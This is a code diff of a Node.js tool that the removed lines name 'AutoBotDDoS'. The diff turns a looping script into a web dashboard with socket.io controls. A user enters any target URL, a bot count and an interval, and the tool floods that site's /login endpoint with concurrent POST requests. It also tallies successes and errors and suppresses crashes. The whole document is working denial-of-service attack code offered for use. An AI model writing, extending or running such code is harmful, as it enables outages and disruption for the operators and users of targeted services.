@@ -1,44 +1,50 @@
-// AutoBotDDoS (2024)
-// Copyright (c) 2024 Rui Reogo
-// Licensed under the MIT License
-
-// anti death
-process.on('uncaughtException', err => {});
-
-// import necessary things
-const config = require('./conf.json');
-const utils = require('./utils');
+const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
 const axios = require('axios');
+const utils = require('./utils');
 
-const bot = async (botId) => {
-  const {
-    AUTOBOT_URL,
-    TIME_INTERVAL
-  } = config;
-  const xurl = AUTOBOT_URL + "/login";
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
 
-  while (true) {
+app.use(express.static('public'));
+
+let stats = { success: 0, errors: 0 };
+let isActive = false;
+
+const runBot = async (botId, targetUrl, interval) => {
+  const xurl = targetUrl.endsWith('/') ? `${targetUrl}login` : `${targetUrl}/login`;
+
+  while (isActive) {
     try {
       const state = utils.getState();
-      axios.post(xurl, {
-        state,
-        commands: []
-      });
-
-      console.log(`Bot ${botId}: successfully sent one!`);
-      await utils.sleep(TIME_INTERVAL);
-    } catch {
-      console.log(`Bot ${botId}: successfully sent one!`);
-    };
-  };
+      await axios.post(xurl, { state, commands: [] });
+      stats.success++;
+      io.emit('log', { msg: `Bot ${botId}: Request Sent!`, stats });
+    } catch (err) {
+      stats.errors++;
+      io.emit('log', { msg: `Bot ${botId}: Connection Failed`, stats });
+    }
+    await utils.sleep(Number(interval));
+  }
 };
 
-const run = () => {
-  const { NUM_BOTS } = config;
+io.on('connection', (socket) => {
+  socket.on('start-bots', (data) => {
+    if (isActive) return;
+    isActive = true;
+    const { url, interval, numBots } = data;
+    for (let i = 0; i < numBots; i++) {
+      runBot(i + 1, url, interval);
+    }
+  });
 
-  for (let i = 0; i < NUM_BOTS; i++) {
-    bot(i + 1);
-  };
-};
+  socket.on('stop-bots', () => {
+    isActive = false;
+    io.emit('log', { msg: "SYSTEM: Stopping bots...", stats });
+  });
+});
 
-run();
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => console.log(`Dashboard live at port ${PORT}`));
